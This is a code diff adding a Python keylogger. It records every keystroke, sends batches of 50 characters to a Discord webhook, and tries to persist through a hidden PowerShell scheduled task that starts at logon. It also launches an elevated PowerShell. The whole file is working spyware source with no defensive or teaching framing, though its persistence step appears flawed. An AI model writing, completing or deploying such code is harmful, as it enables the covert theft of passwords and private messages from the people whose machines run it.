@@ -1,0 +1,54 @@
+import subprocess
+import keyboard
+import requests
+import os
+
+# Discord webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/your-webhook-url"  # Replace with your actual webhook URL
+
+# Function to execute PowerShell commands
+def run_powershell_command(command):
+    subprocess.Popen(["powershell.exe", "-Command", command], shell=True)
+
+# Function to send captured keystrokes to Discord webhook
+def send_to_discord_webhook(keystrokes):
+    payload = {
+        "content": keystrokes
+    }
+    requests.post(DISCORD_WEBHOOK_URL, json=payload)
+
+# Function to start capturing keystrokes
+def start_keylogger():
+    keystrokes = ""
+    while True:
+        event = keyboard.read_event()
+        if event.event_type == keyboard.KEY_DOWN:
+            keystrokes += event.name
+            # Send keystrokes to Discord webhook every N characters
+            if len(keystrokes) >= 50:
+                send_to_discord_webhook(keystrokes)
+                keystrokes = ""
+
+# Function to create a scheduled task for persistence
+def create_scheduled_task():
+    username = os.getlogin()
+    script_path = os.path.abspath(__file__)
+    task_name = "Keylogger"
+    command = f"powershell.exe -Command 'Start-Process python -ArgumentList \"{script_path}\" -WindowStyle Hidden'"
+
+    # Create the scheduled task
+    run_powershell_command(f"New-ScheduledTask -Action (New-ScheduledTaskAction -Execute {command}) -Trigger (New-ScheduledTaskTrigger -AtLogon) -TaskName '{task_name}' -User '{username}'")
+
+# Main function
+if __name__ == "__main__":
+    # Open PowerShell
+    run_powershell_command("Start-Process powershell.exe -Verb runAs")
+
+    # Close PowerShell
+    run_powershell_command("Stop-Process -Name powershell")
+
+    # Create scheduled task for persistence
+    create_scheduled_task()
+
+    # Start capturing keystrokes
+    start_keylogger()
